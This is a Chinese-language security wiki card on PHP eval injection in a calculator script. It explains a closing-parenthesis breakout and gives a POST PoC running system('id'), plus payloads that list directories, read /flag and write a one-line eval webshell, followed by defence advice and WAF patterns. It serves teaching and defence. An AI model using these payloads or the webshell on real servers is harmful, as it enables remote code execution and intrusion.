---
id: web-php-rce-eval-expression-closing-paren-injection
title: PHP 计算器 eval 拼接表达式被右括号闭合导致任意代码执行
type: scenario
domain: web
path: web/php/rce
technique: php-eval-expression-breakout
tags:
- web
- php
- eval
- rce
- code-injection
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V16
  verified_at: '2026-11-05T02:21:11+08:00'
  notes: 已对照原文 SafeCalc calc.php 源码核对：eval("$out=($expr);") 直接拼接用户输入，expr=1);system("id");// 求值为 $out=(1);system("id");//);，右括号闭合+分号分句+//注释尾部，语法合法且执行 system；长度100限制不构成安全边界。原文AWDP防御段仅指出该漏洞点并演示加括号防御，未给出攻击请求/回显截图，卡内PoC为源码推导（语法上确定可行），作为未验证点记录。PoC未本机执行；frontmatter无sources/source_url。
url: /docs/web/php/rce/web-php-rce-eval-expression-closing-paren-injection/
draft: false
kb_aliases:
- eval 表达式注入
- 计算器 RCE
- 右括号闭合逃逸
- \$out=(expr) 绕过
---

## 一句话结论

`eval("\$out=($expr);")` 把用户提交的表达式直接拼进 PHP 代码；只需用 `)` 提前闭合外层括号、用 `;` 结束语句、用 `//` 注释掉尾部 `);`，即可在长度限制内执行任意 PHP 代码。

## 原理

- 服务端把 `expr` 拼成 `$out=(<expr>);` 再 `eval`。`eval` 不区分“表达式”和“语句”，拼接进去的任何字符都会被当作 PHP 源码解析。
- 传入 `1);system('id');//` 后实际执行 `$out=(1);system('id');//);`：`(1)` 合法闭合，`system('id')` 成为独立语句，`//` 把残留的 `);` 注释掉，避免语法错误。
- 长度限制（本例 100 字符）只约束 payload 长度，不构成安全边界；`system`、`file_get_contents`、`scandir` 等短调用足以达成 RCE/文件读取。
- 即使界面只提供数字与四则运算按钮，攻击者可直接构造 POST 请求，绕过前端限制。

## 触发条件

- 用户输入被拼接进 `eval()`（或 `assert()`、`create_function()` 等动态执行）；
- 没有把输入限制为纯数字/运算符白名单，或后端未用真正的表达式解析器；
- 接口有回显或可通过带外/写文件观察执行结果。

## 利用步骤

1. 确认 `expr` 会进入 `eval`，观察普通表达式是否回显结果。
2. 构造 `1);<任意 PHP>;//`，关闭外层括号与语句并注释尾部。
3. 先执行 `phpinfo()`/`system('id')` 确认代码执行，再读取 flag 或写 webshell。
4. 若长度受限，用短函数（`system`、`readfile`、`scandir`）或分步写入临时文件。

## PoC

```http
POST /calc.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

expr=1);system('id');//
```

实际执行：

```php
$out=(1);system('id');//);
```

其他等价 payload：

```text
1);print_r(scandir('/'));//
1);readfile('/flag');//
1);file_put_contents('shell.php','<?php eval($_POST[1]);?>');//
```

## 变体与关联

- 若外层是 `eval('return '.$expr.';')`，可用 `1;system('id');//` 或 `1, system('id')` 等结构逃逸。
- `preg_replace` 的 `/e`、`assert`、`create_function`、模板编译都是同类“字符串变代码”入口。
- 与 PHP 文件包含/反序列化关联：RCE 后可写 webshell、包含日志或反序列化落地。
- 仅有 `is_numeric`/长度检查不充分；攻击者可用科学计数法、数组、编码等方式绕过。

## 检测与防御

- 禁止 `eval` 执行用户输入；用专门的表达式解析器（tokenizer + 递归下降/逆波兰）只接受数字与四则运算符。
- 若必须求值，先用严格白名单正则 `^[0-9+\-*/(). ]+$` 校验并 `floatval`，同时禁用函数调用字符。
- 前端限制不可信，后端必须独立校验；错误信息不要回显源码或执行细节。
- 日志/WAF 监控 `);`、`system(`、`phpinfo(`、`base64_decode(` 等出现在表达式参数中的特征。
- 代码审计搜索 `eval(`、`assert(`、`create_function(` 与 `$_GET/$_POST` 的拼接路径。
